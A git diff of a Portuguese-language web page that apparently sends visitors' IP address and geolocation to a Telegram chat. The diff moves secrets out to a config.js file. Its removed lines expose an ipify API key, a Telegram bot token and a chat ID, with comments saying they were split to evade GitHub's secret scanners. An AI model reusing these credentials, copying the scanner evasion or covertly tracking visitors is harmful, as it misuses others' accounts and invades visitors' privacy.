@@ -306,6 +306,7 @@
         </div>
     </div>
 
+    <script src="config.js"></script>
     <script>
         const btnNao = document.getElementById('btn-nao');
         const btnSim = document.getElementById('btn-sim');
@@ -598,17 +599,11 @@
             }, 800);
 
             // --- INTEGRAÇÃO TELEGRAM & IPIFY ---
-            // Chave da API do Ipify dividida para proteção básica contra scrapers automatizados do GitHub
-            const ipifyKeyPart1 = "at_a2z";
-            const ipifyKeyPart2 = "9XK2fvdoMCCGvxbPrqfZqfd9b8";
-            const ipifyApiKey = ipifyKeyPart1 + ipifyKeyPart2;
-
-            // Token do Telegram e ID do Chat fornecidos pelo usuário
-            // Dividido em partes para evitar que scrapers de segredos do GitHub o desativem automaticamente
-            const telegramTokenPart1 = "8430005472:";
-            const telegramTokenPart2 = "AAH9OBNfFx4FUXnfkR5NcZ0xedoZBMZ73vA";
-            const telegramBotToken = telegramTokenPart1 + telegramTokenPart2;
-            const telegramChatId = "373603415";
+            // Credenciais sensíveis carregadas a partir do config.js externo (ignorado no GitHub por segurança)
+            // Em produção no GitHub Pages, as credenciais são injetadas em tempo de deploy via GitHub Actions
+            const ipifyApiKey = typeof CONFIG !== 'undefined' ? CONFIG.IPIFY_API_KEY : 'SUA_API_KEY_IPIFY';
+            const telegramBotToken = typeof CONFIG !== 'undefined' ? CONFIG.TELEGRAM_BOT_TOKEN : 'SEU_TELEGRAM_BOT_TOKEN';
+            const telegramChatId = typeof CONFIG !== 'undefined' ? CONFIG.TELEGRAM_CHAT_ID : '373603415';
 
             const sendNotification = (ip = "Não detectado", geoData = null) => {
                 let locationDetails = "";
